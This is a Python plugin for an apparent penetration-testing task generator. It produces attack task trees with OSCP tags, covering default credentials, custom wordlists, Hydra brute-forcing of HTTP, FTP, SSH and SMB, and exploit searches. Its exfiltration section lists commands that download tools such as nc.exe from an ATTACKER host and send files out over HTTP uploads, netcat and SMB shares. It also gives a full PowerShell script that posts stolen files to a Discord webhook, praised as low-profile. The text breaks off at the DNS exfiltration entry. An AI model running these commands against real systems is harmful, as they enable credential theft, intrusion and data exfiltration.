"""
Generic Attack Techniques Plugin

Generates tasks for cross-cutting attack techniques including:
- Default credential testing
- Custom wordlist generation
- Service-specific brute-forcing
- Data exfiltration methods
- Exploit research workflows
- Archive exploitation techniques

This plugin activates when any service is detected to provide
generic attack vectors applicable across different services.

Extracted from HackTricks: brute-force.md, exfiltration.md,
search-exploits.md, archive-extraction-path-traversal.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class GenericAttackTechniquesPlugin(ServicePlugin):
    """Generic attack techniques applicable across services"""

    @property
    def name(self) -> str:
        return "generic-attacks"

    @property
    def default_ports(self) -> List[int]:
        return []  # Applies to any port

    @property
    def service_names(self) -> List[str]:
        return ['*']  # Universal plugin

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Always activates to provide generic attack options"""
        # Only activate once per target, not per port
        # Implementation note: This should be called once globally
        return False  # Disabled by default - activate manually or via special trigger

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate generic attack technique task tree"""

        service = service_info.get('service', 'unknown')
        product = service_info.get('product', '')
        version = service_info.get('version', '')

        tasks = {
            'id': 'generic-attacks',
            'name': 'Generic Attack Techniques',
            'type': 'parent',
            'children': []
        }

        # === PHASE 1: CREDENTIAL ATTACKS ===
        tasks['children'].append(self._create_credential_attacks(target, port, service))

        # === PHASE 2: EXPLOIT RESEARCH ===
        if product or version:
            tasks['children'].append(self._create_exploit_research(product, version, service))

        # === PHASE 3: DATA EXFILTRATION ===
        tasks['children'].append(self._create_exfiltration_methods(target))

        # === PHASE 4: SPECIALIZED TECHNIQUES ===
        tasks['children'].append(self._create_specialized_techniques(target, port, service))

        return tasks

    def _create_credential_attacks(self, target: str, port: int, service: str) -> Dict[str, Any]:
        """Create credential attack task tree"""

        return {
            'id': 'credential-attacks',
            'name': 'Credential Attacks',
            'type': 'parent',
            'children': [
                # === DEFAULT CREDENTIALS ===
                {
                    'id': 'default-creds-research',
                    'name': 'Research Default Credentials',
                    'type': 'manual',
                    'metadata': {
                        'description': f'Search for default credentials for {service}',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RESEARCH', 'MANUAL'],
                        'success_indicators': [
                            'Default credentials found in databases',
                            'Vendor documentation lists defaults',
                            'Community posts reveal common passwords'
                        ],
                        'failure_indicators': [
                            'No default credentials documented',
                            'Service requires custom credentials'
                        ],
                        'next_steps': [
                            'Test discovered credentials immediately',
                            'Document all tested credentials',
                            'Try credential variations (admin/Admin/ADMIN)',
                            'Attempt null/blank passwords'
                        ],
                        'alternatives': [
                            'Google: "default password" + service name',
                            'Check vendor documentation',
                            'Search GitHub for config examples',
                            'Review exploit-db for credentials in exploits'
                        ],
                        'notes': '''
Default Credential Databases:
- https://github.com/ihebski/DefaultCreds-cheat-sheet
- https://cirt.net/passwords
- https://datarecovery.com/rd/default-passwords/
- https://github.com/danielmiessler/SecLists (Passwords/Default-Credentials/)
- https://many-passwords.github.io/

Search Pattern: "[product] default password" or "[service] default credentials"
Common defaults: admin/admin, admin/password, root/root, admin/[blank]
'''
                    }
                },

                # === WORDLIST GENERATION ===
                {
                    'id': 'wordlist-generation',
                    'name': 'Custom Wordlist Generation',
                    'type': 'parent',
                    'children': [
                        # CRUNCH
                        {
                            'id': 'crunch-wordlist',
                            'name': 'Generate Pattern-Based Wordlist (Crunch)',
                            'type': 'command',
                            'metadata': {
                                'command': 'crunch 6 8 -t ,@@^^%% -o custom_wordlist.txt',
                                'description': 'Generate wordlist with specific character patterns',
                                'flag_explanations': {
                                    '6 8': 'Minimum 6 chars, maximum 8 chars',
                                    '-t': 'Pattern template using charset symbols',
                                    ',': 'Upper case alpha (A-Z)',
                                    '@': 'Lower case alpha (a-z)',
                                    '^': 'Special characters',
                                    '%': 'Numeric (0-9)',
                                    '-o': 'Output file path'
                                },
                                'tags': ['OSCP:MEDIUM', 'WORDLIST', 'BRUTE_FORCE'],
                                'success_indicators': [
                                    'Wordlist file created',
                                    'File size appropriate for pattern',
                                    'Sample lines match expected pattern'
                                ],
                                'failure_indicators': [
                                    'Output file empty',
                                    'Pattern too broad (file too large)',
                                    'Disk space exhausted'
                                ],
                                'next_steps': [
                                    'Verify wordlist contents: head -20 custom_wordlist.txt',
                                    'Check file size: wc -l custom_wordlist.txt',
                                    'Use in brute-force attack',
                                    'Combine with other wordlists if needed'
                                ],
                                'alternatives': [
                                    'crunch 4 4 0123456789ABCDEF -o hex4.txt (hex patterns)',
                                    'crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha',
                                    'Manual: Create Python script for custom patterns',
                                    'john --stdout --mask=?u?l?l?l?d?d (John rules)'
                                ],
                                'notes': '''
Crunch Patterns:
@ = Lower case (a-z)
, = Upper case (A-Z)
% = Numbers (0-9)
^ = Special chars (!@#$%...)

Example: ,@@^^%% generates passwords like "Abc!#12"

WARNING: Large wordlists consume significant disk space.
Calculate size first: crunch 8 8 | wc -l
'''
                            }
                        },

                        # CEWL
                        {
                            'id': 'cewl-wordlist',
                            'name': 'Scrape Website for Wordlist (CeWL)',
                            'type': 'command',
                            'metadata': {
                                'command': f'cewl http://{target} -m 5 -w cewl_wordlist.txt --with-numbers',
                                'description': 'Generate wordlist from target website content',
                                'flag_explanations': {
                                    'http://target': 'Target URL to spider',
                                    '-m 5': 'Minimum word length (5 characters)',
                                    '-w': 'Output wordlist file',
                                    '--with-numbers': 'Include words with numbers'
                                },
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'WORDLIST', 'RECON'],
                                'success_indicators': [
                                    'Wordlist file contains target-specific terms',
                                    'Company names, product names captured',
                                    'Technical terms related to business'
                                ],
                                'failure_indicators': [
                                    'Empty wordlist (no text content)',
                                    'Connection refused',
                                    '403 Forbidden (blocked)',
                                    'Only generic words (lorem ipsum, etc)'
                                ],
                                'next_steps': [
                                    'Review wordlist for company/employee names',
                                    'Append common suffixes: cat cewl.txt | sed "s/$/@123/g"',
                                    'Combine with year variations',
                                    'Use in password attacks'
                                ],
                                'alternatives': [
                                    f'Manual: curl http://{target} | grep -oE "\\w{{5,}}" | sort -u',
                                    'Browser: View source, copy interesting terms',
                                    f'wget -r -l 2 http://{target} && grep -roh "\\w{{5,}}" | sort -u',
                                    'Burp Suite: Spider target, export words from responses'
                                ],
                                'notes': '''
CeWL Advanced Options:
-d [depth] = Spider depth (default: 2)
-e = Include email addresses
-a = Include metadata
--lowercase = Convert all to lowercase
--meta = Follow meta refresh redirects

Combine with username enumeration for targeted attacks.
Common pattern: firstname.lastname, fname123, etc.
'''
                            }
                        },

                        # CUPP
                        {
                            'id': 'cupp-profile',
                            'name': 'Generate Profile-Based Wordlist (CUPP)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Create personalized wordlist based on target information',
                                'command': 'cupp -i',
                                'tags': ['OSCP:MEDIUM', 'WORDLIST', 'MANUAL', 'TARGETED'],
                                'success_indicators': [
                                    'Wordlist contains target-specific patterns',
                                    'Names, dates, pet names included',
                                    'Variations and combinations generated'
                                ],
                                'failure_indicators': [
                                    'Insufficient target information',
                                    'Generic wordlist produced'
                                ],
                                'next_steps': [
                                    'Use in password attacks against user accounts',
                                    'Prioritize high-value targets (admins)',
                                    'Combine with mangling rules'
                                ],
                                'alternatives': [
                                    'Manual: Create variations of known info',
                                    'Wister: python3 wister.py -w name date location',
                                    'Pydictor: Various wordlist generation modes',
                                    'Mentalist: GUI wordlist generator'
                                ],
                                'notes': '''
CUPP (Common User Passwords Profiler)
Installation: git clone https://github.com/Mebus/cupp

Information to gather:
- Target name, nickname
- Birthday, anniversary dates
- Pet names
- Favorite sports team
- Hobbies
- Children's names

Generates combinations, leet speak, year variations
Example: JohnDoe, john123, J0hnD0e, johndoe2024
'''
                            }
                        },

                        # JOHN RULES
                        {
                            'id': 'john-mutate',
                            'name': 'Mutate Wordlist with John Rules',
                            'type': 'command',
                            'metadata': {
                                'command': 'john --wordlist=base.txt --rules=best64 --stdout > mutated.txt',
                                'description': 'Apply mutation rules to existing wordlist',
                                'flag_explanations': {
                                    '--wordlist': 'Base wordlist to mutate',
                                    '--rules': 'Rule set to apply (best64 = top rules)',
                                    '--stdout': 'Output to stdout instead of cracking',
                                    '> mutated.txt': 'Redirect output to file'
                                },
                                'tags': ['OSCP:MEDIUM', 'WORDLIST', 'BRUTE_FORCE'],
                                'success_indicators': [
                                    'Output wordlist larger than input',
                                    'Contains variations (case, leet, numbers)',
                                    'Mutations applied successfully'
                                ],
                                'failure_indicators': [
                                    'Output same size as input (no mutations)',
                                    'Rule syntax errors'
                                ],
                                'next_steps': [
                                    'Remove duplicates: sort -u mutated.txt -o mutated.txt',
                                    'Test wordlist in brute-force attack',
                                    'Combine with other wordlists'
                                ],
                                'alternatives': [
                                    'john --wordlist=base.txt --rules=all --stdout (all rules)',
                                    'hashcat --stdout -a 0 base.txt -r rules/best64.rule',
                                    'Manual: sed, awk transformations',
                                    'Python script with custom mutations'
                                ],
                                'notes': '''
Common John Rules:
- best64: Top 64 rules (good balance)
- all: Every rule (very large output)
- single: Single mode rules
- wordlist: Standard wordlist rules

Custom rules location: /etc/john/john.conf

Example mutations:
password â†’ Password, PASSWORD, p@ssword, password123, drowssap
'''
                            }
                        }
                    ]
                },

                # === SERVICE BRUTE-FORCING ===
                {
                    'id': 'service-brute-force',
                    'name': f'Service Brute-force: {service}',
                    'type': 'parent',
                    'children': self._get_service_specific_brute_force(target, port, service)
                }
            ]
        }

    def _get_service_specific_brute_force(self, target: str, port: int, service: str) -> List[Dict[str, Any]]:
        """Generate service-specific brute-force tasks"""

        tasks = []

        # HTTP Basic Auth
        if service in ['http', 'https', 'http-proxy']:
            tasks.append({
                'id': f'http-basic-brute-{port}',
                'name': 'HTTP Basic Auth Brute-force',
                'type': 'command',
                'metadata': {
                    'command': f'hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt {target} http-get / -s {port}',
                    'description': 'Brute-force HTTP Basic Authentication',
                    'flag_explanations': {
                        '-L': 'Username wordlist',
                        '-P': 'Password wordlist',
                        'http-get': 'HTTP GET method with basic auth',
                        '/': 'Path to protected resource',
                        '-s': 'Specify non-standard port'
                    },
                    'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'NOISY'],
                    'success_indicators': [
                        'Valid credentials found',
                        '200 OK response with credentials'
                    ],
                    'failure_indicators': [
                        'All attempts return 401',
                        'Rate limiting detected',
                        'Account lockout triggered'
                    ],
                    'alternatives': [
                        f'medusa -h {target} -u admin -P passwords.txt -M http -m DIR:/ -n {port}',
                        f'nmap --script http-brute -p {port} {target}',
                        f'Manual: curl -u admin:password http://{target}/',
                        'Browser: Try common credentials manually'
                    ],
                    'notes': 'For HTTPS use "http-get" with https:// URL. Add -V for verbose output.'
                }
            })

        # FTP
        elif service in ['ftp', 'ftps']:
            tasks.append({
                'id': f'ftp-brute-{port}',
                'name': 'FTP Brute-force',
                'type': 'command',
                'metadata': {
                    'command': f'hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ftp -s {port}',
                    'description': 'Brute-force FTP credentials',
                    'flag_explanations': {
                        '-l': 'Single username (or -L for username list)',
                        '-P': 'Password wordlist',
                        'ftp': 'Protocol module',
                        '-s': 'Port number'
                    },
                    'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'NOISY'],
                    'alternatives': [
                        f'medusa -h {target} -u admin -P passwords.txt -M ftp',
                        f'ncrack -p {port} --user admin -P passwords.txt {target}',
                        f'Manual: ftp {target} {port} (test manually)'
                    ],
                    'notes': 'Try anonymous/anonymous first before brute-forcing'
                }
            })

        # SSH
        elif service == 'ssh':
            tasks.append({
                'id': f'ssh-brute-{port}',
                'name': 'SSH Brute-force',
                'type': 'command',
                'metadata': {
                    'command': f'hydra -l root -P /usr/share/wordlists/rockyou.txt {target} ssh -s {port} -t 4',
                    'description': 'Brute-force SSH credentials (use cautiously)',
                    'flag_explanations': {
                        '-l': 'Username to test',
                        '-P': 'Password wordlist',
                        'ssh': 'SSH protocol module',
                        '-t 4': 'Use 4 parallel threads (prevents lockout)'
                    },
                    'tags': ['OSCP:LOW', 'BRUTE_FORCE', 'NOISY', 'SLOW'],
                    'success_indicators': [
                        'Valid credentials discovered',
                        'SSH login successful'
                    ],
                    'failure_indicators': [
                        'Connection throttling',
                        'Account lockout after failures',
                        'Too many authentication failures'
                    ],
                    'alternatives': [
                        f'medusa -h {target} -u root -P passwords.txt -M ssh',
                        f'ncrack -p {port} --user root -P passwords.txt {target}',
                        'Check for SSH key files instead of password attacks',
                        'Try known weak keys: /usr/share/wordlists/ssh-keys/'
                    ],
                    'notes': '''
WARNING: SSH brute-forcing is SLOW and NOISY
- Often triggers IDS/IPS
- May cause account lockouts
- SSH has rate limiting built-in

Better alternatives:
1. Search for SSH private keys on target
2. Test default/weak keys
3. Check for SSH key reuse
4. Exploit SSH vulnerabilities instead
'''
                }
            })

        # SMB
        elif service in ['smb', 'microsoft-ds', 'netbios-ssn']:
            tasks.append({
                'id': f'smb-brute-{port}',
                'name': 'SMB Brute-force',
                'type': 'command',
                'metadata': {
                    'command': f'hydra -l Administrator -P /usr/share/wordlists/rockyou.txt {target} smb -t 1',
                    'description': 'Brute-force SMB/Windows credentials',
                    'flag_explanations': {
                        '-l': 'Username (Administrator common on Windows)',
                        '-P': 'Password wordlist',
                        'smb': 'SMB protocol module',
                        '-t 1': 'Single thread (prevents lockout)'
                    },
                    'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'NOISY'],
                    'alternatives': [
                        f'crackmapexec smb {target} -u admin -p passwords.txt',
                        f'nmap --script smb-brute -p {port} {target}',
                        'Check for null sessions first: smbclient -L //{target} -N'
                    ],
                    'notes': 'Windows locks accounts after failed attempts. Use -t 1 to be safe.'
                }
            })

        # Generic fallback
        else:
            tasks.append({
                'id': f'generic-brute-{port}',
                'name': f'Generic Brute-force: {service}',
                'type': 'manual',
                'metadata': {
                    'description': f'Research brute-force methods for {service}',
                    'tags': ['OSCP:MEDIUM', 'RESEARCH', 'MANUAL'],
                    'alternatives': [
                        f'Check Hydra modules: hydra -h | grep {service}',
                        f'Check Medusa modules: medusa -d | grep {service}',
                        f'Search: "brute force {service} password"',
                        'Review exploit-db for auth bypass exploits'
                    ],
                    'notes': f'Hydra supports 50+ protocols. Check: hydra -h'
                }
            })

        return tasks

    def _create_exploit_research(self, product: str, version: str, service: str) -> Dict[str, Any]:
        """Create exploit research task tree"""

        search_term = f"{product} {version}".strip() or service

        return {
            'id': 'exploit-research',
            'name': f'Exploit Research: {search_term}',
            'type': 'parent',
            'children': [
                # SEARCHSPLOIT
                {
                    'id': 'searchsploit-lookup',
                    'name': f'SearchSploit: {search_term}',
                    'type': 'command',
                    'metadata': {
                        'command': f'searchsploit "{search_term}"',
                        'description': 'Search local ExploitDB database for known exploits',
                        'flag_explanations': {
                            '"search term"': 'Product name and version to search'
                        },
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RESEARCH'],
                        'success_indicators': [
                            'Exploits found matching version',
                            'Local/Remote exploits listed',
                            'Path to exploit scripts shown'
                        ],
                        'failure_indicators': [
                            'No results found',
                            'Only unrelated exploits shown'
                        ],
                        'next_steps': [
                            'Read exploit details: searchsploit -x [EDB-ID]',
                            'Copy exploit to working directory: searchsploit -m [EDB-ID]',
                            'Review exploit requirements and dependencies',
                            'Test exploit in controlled environment first'
                        ],
                        'alternatives': [
                            f'searchsploit -m [EDB-ID] (mirror exploit file)',
                            f'searchsploit -p [EDB-ID] (show full path)',
                            f'searchsploit -x [EDB-ID] (examine exploit)',
                            f'Online: https://www.exploit-db.com/search?q={search_term}',
                            'Update database: searchsploit -u'
                        ],
                        'notes': '''
SearchSploit Tips:
- Use quotes for multi-word searches
- Be specific with versions
- Check exploit dates (old exploits may need updates)
- Review exploit code before running
- Test in VM first

Update ExploitDB: searchsploit -u
Path: /usr/share/exploitdb/
'''
                    }
                },

                # ONLINE DATABASES
                {
                    'id': 'online-exploit-search',
                    'name': 'Online Exploit Databases',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Search online exploit repositories and databases',
                        'tags': ['OSCP:HIGH', 'RESEARCH', 'MANUAL'],
                        'success_indicators': [
                            'Additional exploits found not in local DB',
                            'PoC code available on GitHub',
                            'Recent exploits discovered'
                        ],
                        'failure_indicators': [
                            'No new exploits beyond searchsploit',
                            'Only CVE references without PoC'
                        ],
                        'next_steps': [
                            'Download and review exploit code',
                            'Check exploit requirements',
                            'Verify target vulnerability',
                            'Test exploit safely'
                        ],
                        'alternatives': [
                            f'Google: "{search_term} exploit"',
                            f'Google: "{search_term} CVE"',
                            f'Google: "site:github.com {search_term} exploit"'
                        ],
                        'notes': '''
Online Exploit Databases:

ExploitDB (web):
https://www.exploit-db.com/

Packet Storm Security:
https://packetstormsecurity.com/

Vulners:
https://vulners.com/search?query={search_term}

Sploitus (meta-search):
https://sploitus.com/?query={search_term}

Sploitify (curated):
https://sploitify.haxx.it

search_vulns (multi-source):
https://search-vulns.com/

GitHub PoCs:
https://github.com/search?q={search_term}+exploit

Shodan Exploits:
https://exploits.shodan.io/

SEARCH PATTERN:
1. SearchSploit (local, fast)
2. ExploitDB (web version, more details)
3. GitHub (recent PoCs)
4. Packet Storm (alternative source)
5. Vulners (CVE mapping)
'''
                    }
                },

                # METASPLOIT
                {
                    'id': 'msf-search',
                    'name': f'Metasploit Module Search: {search_term}',
                    'type': 'command',
                    'metadata': {
                        'command': f'msfconsole -q -x "search {search_term}; exit"',
                        'description': 'Search Metasploit framework for exploit modules',
                        'flag_explanations': {
                            '-q': 'Quiet mode (skip banner)',
                            '-x': 'Execute command and exit',
                            'search': 'Search modules by keyword'
                        },
                        'tags': ['OSCP:HIGH', 'RESEARCH', 'EXPLOIT'],
                        'success_indicators': [
                            'Exploit modules found',
                            'Auxiliary modules for enumeration',
                            'Post-exploitation modules available'
                        ],
                        'failure_indicators': [
                            'No modules found',
                            'Only unrelated modules'
                        ],
                        'next_steps': [
                            'Launch msfconsole interactively',
                            'Load exploit module: use exploit/path/to/module',
                            'Review options: show options',
                            'Set RHOSTS and other required options',
                            'Run exploit: exploit or run'
                        ],
                        'alternatives': [
                            'Interactive: msfconsole then "search {term}"',
                            f'Grep modules: grep -r "{search_term}" /usr/share/metasploit-framework/modules/',
                            'MSF online: https://www.rapid7.com/db/',
                            'Manual: Review exploit code on GitHub'
                        ],
                        'notes': '''
Metasploit Search Filters:
search type:exploit platform:linux {search_term}
search type:auxiliary port:445
search cve:2021 target:windows

Common module types:
- exploit: Active exploitation
- auxiliary: Scanners, fuzzers, enumeration
- post: Post-exploitation modules
- payload: Shells, meterpreter, etc.
'''
                    }
                },

                # CVE LOOKUP
                {
                    'id': 'cve-lookup',
                    'name': f'CVE Database Lookup: {search_term}',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Search CVE databases for vulnerability details',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH', 'MANUAL'],
                        'success_indicators': [
                            'CVE IDs identified',
                            'CVSS scores indicate high severity',
                            'Exploit availability confirmed'
                        ],
                        'failure_indicators': [
                            'No CVEs found for this version',
                            'CVEs exist but no public exploits'
                        ],
                        'next_steps': [
                            'Read CVE descriptions and technical details',
                            'Check CVSS score (7.0+ = high severity)',
                            'Look for PoC code in CVE references',
                            'Search GitHub for CVE number'
                        ],
                        'alternatives': [
                            'NVD: https://nvd.nist.gov/vuln/search',
                            'CVE Details: https://www.cvedetails.com/',
                            'VulnDB: https://vuldb.com/',
                            'Command line: nmap --script vulners -sV'
                        ],
                        'notes': '''
CVE Resources:

National Vulnerability Database (NVD):
https://nvd.nist.gov/vuln/search/results?query={search_term}

CVE Details:
https://www.cvedetails.com/google-search-results.php?q={search_term}

VulnDB:
https://vuldb.com/?search={search_term}

CVSS Severity Scale:
0.0 - None
0.1-3.9 - Low
4.0-6.9 - Medium
7.0-8.9 - High
9.0-10.0 - Critical

Key CVE Fields:
- Description: Vulnerability details
- References: Links to advisories, exploits
- CVSS Score: Severity rating
- CWE: Vulnerability type classification
'''
                    }
                }
            ]
        }

    def _create_exfiltration_methods(self, target: str) -> Dict[str, Any]:
        """Create data exfiltration task tree"""

        return {
            'id': 'data-exfiltration',
            'name': 'Data Exfiltration Methods',
            'type': 'parent',
            'children': [
                # === HTTP EXFILTRATION ===
                {
                    'id': 'http-exfiltration',
                    'name': 'HTTP-Based Exfiltration',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'http-server-setup',
                            'name': 'Setup HTTP Server (Receiver)',
                            'type': 'command',
                            'metadata': {
                                'command': 'python3 -m http.server 8000',
                                'description': 'Start simple HTTP server to receive files',
                                'flag_explanations': {
                                    '-m http.server': 'Python module for HTTP server',
                                    '8000': 'Port to listen on'
                                },
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXFILTRATION'],
                                'success_indicators': [
                                    'Server listening on port 8000',
                                    'Serving current directory',
                                    'Accessible from target network'
                                ],
                                'failure_indicators': [
                                    'Port already in use',
                                    'Firewall blocking connections'
                                ],
                                'next_steps': [
                                    'From target: wget http://ATTACKERIP:8000/file',
                                    'From target: curl http://ATTACKERIP:8000/file -o file',
                                    'Upload server: python3 -m uploadserver'
                                ],
                                'alternatives': [
                                    'python3 -m uploadserver (supports file uploads)',
                                    'php -S 0.0.0.0:8000',
                                    'ruby -run -e httpd . -p 8000',
                                    'busybox httpd -f -p 8000',
                                    'socat TCP-LISTEN:8000,fork SYSTEM:"cat"'
                                ],
                                'notes': '''
File Upload Server:
python3 -m pip install uploadserver
python3 -m uploadserver 8000

From target (upload):
curl -X POST -F 'files=@data.txt' http://ATTACKERIP:8000/upload

From target (download):
wget http://ATTACKERIP:8000/file
curl http://ATTACKERIP:8000/file -o local_file
'''
                            }
                        },

                        {
                            'id': 'http-download-target',
                            'name': 'Download File from Target (HTTP)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Techniques to download files from compromised target',
                                'tags': ['OSCP:HIGH', 'EXFILTRATION', 'MANUAL'],
                                'alternatives': [
                                    'Linux: wget http://ATTACKER:8000/tool.sh',
                                    'Linux: curl http://ATTACKER:8000/tool.sh -o tool.sh',
                                    'Windows: certutil -urlcache -split -f http://ATTACKER:8000/nc.exe nc.exe',
                                    'Windows PowerShell: (New-Object Net.WebClient).DownloadFile("http://ATTACKER/nc.exe","nc.exe")',
                                    'Windows PowerShell: Invoke-WebRequest http://ATTACKER/nc.exe -OutFile nc.exe',
                                    'Windows: bitsadmin /transfer job http://ATTACKER/file.exe C:\\temp\\file.exe'
                                ],
                                'notes': '''
Linux Download Methods:
wget http://ATTACKER/file -O /tmp/file
curl http://ATTACKER/file -o /tmp/file
fetch http://ATTACKER/file (FreeBSD)

Windows Download Methods:
certutil -urlcache -split -f http://ATTACKER/nc.exe nc.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER/nc.exe','nc.exe')"
powershell -c "Invoke-WebRequest http://ATTACKER/nc.exe -OutFile nc.exe"
powershell -c "iwr http://ATTACKER/nc.exe -outf nc.exe"
bitsadmin /transfer myDownload http://ATTACKER/nc.exe C:\\Temp\\nc.exe

Save location tips:
Linux: /tmp, /dev/shm, /var/tmp
Windows: C:\\Windows\\Temp, C:\\Users\\Public, C:\\ProgramData
'''
                            }
                        },

                        {
                            'id': 'webhook-exfil',
                            'name': 'Webhook-Based Exfiltration (Discord/Slack)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Use collaboration platform webhooks for data exfiltration',
                                'tags': ['OSCP:MEDIUM', 'EXFILTRATION', 'STEALTH', 'C2'],
                                'success_indicators': [
                                    'Data appears in webhook channel',
                                    'Files successfully uploaded',
                                    'Beaconing working'
                                ],
                                'failure_indicators': [
                                    'Webhook disabled or revoked',
                                    'Rate limiting triggered',
                                    'Content filtered/blocked'
                                ],
                                'alternatives': [
                                    'Discord webhook (PowerShell script)',
                                    'Slack incoming webhook',
                                    'Microsoft Teams webhook',
                                    'Telegram bot API'
                                ],
                                'notes': '''
Discord Webhook Exfiltration (PowerShell):

$webhook = "https://discord.com/api/webhooks/ID/TOKEN"
$client = [System.Net.Http.HttpClient]::new()

# Send text
$payload = @{ content = "Exfil data here" } | ConvertTo-Json
$json = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($json, "payload_json")
$resp = $client.PostAsync($webhook, $mp).Result

# Send file
$bytes = [System.IO.File]::ReadAllBytes("C:\\sensitive.txt")
$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
$json = @{ content = "File exfil" } | ConvertTo-Json
$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$mp.Add($fileContent, "file", "data.txt")
$resp = $client.PostAsync($webhook, $mp).Result

Advantages:
- HTTPS (encrypted)
- Trusted domains (often whitelisted)
- No authentication needed
- File upload support
- Low profile
'''
                            }
                        }
                    ]
                },

                # === FTP EXFILTRATION ===
                {
                    'id': 'ftp-exfiltration',
                    'name': 'FTP Exfiltration',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'ftp-server-setup',
                            'name': 'Setup FTP Server',
                            'type': 'command',
                            'metadata': {
                                'command': 'python3 -m pyftpdlib -p 21 -w',
                                'description': 'Start FTP server for file transfer',
                                'flag_explanations': {
                                    '-m pyftpdlib': 'Python FTP server module',
                                    '-p 21': 'Listen on port 21',
                                    '-w': 'Write permission enabled'
                                },
                                'tags': ['OSCP:MEDIUM', 'EXFILTRATION'],
                                'alternatives': [
                                    'sudo python3 -m pyftpdlib -p 21 -w (needs root for port 21)',
                                    'python3 -m pyftpdlib -p 2121 -w (non-privileged port)',
                                    'pure-ftpd installation and configuration',
                                    'vsftpd for production use'
                                ],
                                'notes': '''
Install: pip3 install pyftpdlib

Anonymous access by default
Credentials: anonymous/anonymous

From Windows target:
echo open ATTACKERIP 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt

From Linux target:
ftp ATTACKERIP
(user: anonymous, pass: anonymous)
binary
get file
put local_file
'''
                            }
                        }
                    ]
                },

                # === SMB EXFILTRATION ===
                {
                    'id': 'smb-exfiltration',
                    'name': 'SMB Exfiltration',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'smb-server-setup',
                            'name': 'Setup SMB Server (Impacket)',
                            'type': 'command',
                            'metadata': {
                                'command': 'impacket-smbserver -smb2support share $(pwd)',
                                'description': 'Start SMB server to share current directory',
                                'flag_explanations': {
                                    '-smb2support': 'Enable SMB2 protocol (required for modern Windows)',
                                    'share': 'Share name',
                                    '$(pwd)': 'Share current directory'
                                },
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXFILTRATION'],
                                'success_indicators': [
                                    'SMB server listening',
                                    'Share accessible from Windows target',
                                    'Files visible from target'
                                ],
                                'failure_indicators': [
                                    'Windows 10+ blocks unsigned SMB',
                                    'Firewall blocking port 445'
                                ],
                                'alternatives': [
                                    'impacket-smbserver -smb2support -user user -password pass share .',
                                    'Samba configuration for persistent share',
                                    'smbserver.py script directly'
                                ],
                                'notes': '''
From Windows target:
\\\\ATTACKERIP\\share\\file.exe
copy sensitive.txt \\\\ATTACKERIP\\share\\
net use Z: \\\\ATTACKERIP\\share
dir Z:\\

With authentication (required on Win10+):
impacket-smbserver -smb2support -user test -password test share $(pwd)

From Windows:
net use Z: \\\\ATTACKERIP\\share /user:test test
dir Z:\\

PowerShell:
New-PSDrive -Name "X" -PSProvider "FileSystem" -Root "\\\\ATTACKERIP\\share"
cd X:
'''
                            }
                        }
                    ]
                },

                # === OTHER METHODS ===
                {
                    'id': 'other-exfil-methods',
                    'name': 'Alternative Exfiltration Methods',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'netcat-exfil',
                            'name': 'Netcat File Transfer',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Transfer files using netcat',
                                'tags': ['OSCP:HIGH', 'MANUAL', 'EXFILTRATION'],
                                'alternatives': [
                                    'Receiver: nc -lvnp 4444 > received_file',
                                    'Sender: nc -vn ATTACKERIP 4444 < file_to_send',
                                    'Receiver (upload): nc -lvnp 4444 < file_to_serve',
                                    'Sender (download): nc ATTACKERIP 4444 > downloaded_file'
                                ],
                                'notes': '''
Download from attacker:
Attacker: nc -lvnp 4444 < tool.exe
Target: nc ATTACKERIP 4444 > tool.exe

Upload to attacker:
Attacker: nc -lvnp 4444 > data.txt
Target: nc ATTACKERIP 4444 < data.txt

Binary mode (important):
Both sides should use -q 0 for proper file transfer
'''
                            }
                        },

                        {
                            'id': 'base64-exfil',
                            'name': 'Base64 Copy-Paste Exfiltration',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Transfer files via base64 encoding (copy-paste)',
                                'tags': ['OSCP:HIGH', 'MANUAL', 'EXFILTRATION'],
                                'alternatives': [
                                    'Linux encode: base64 -w0 file.txt',
                                    'Linux decode: base64 -d encoded.txt > file.txt',
                                    'Windows encode: certutil -encode file.exe file.b64',
                                    'Windows decode: certutil -decode file.b64 file.exe'
                                ],
                                'notes': '''
Use case: No network file transfer available, but you have terminal access

Encode on target:
Linux: base64 -w0 /etc/passwd
Windows: certutil -encode C:\\sensitive.txt output.b64

Copy the base64 output, paste on attacker:
echo "<base64_string>" | base64 -d > file

Good for small files (<1MB)
Survives terminal encoding issues
'''
                            }
                        },

                        {
                            'id': 'dns-exfil',
                            'name': 'DNS Exfiltration',
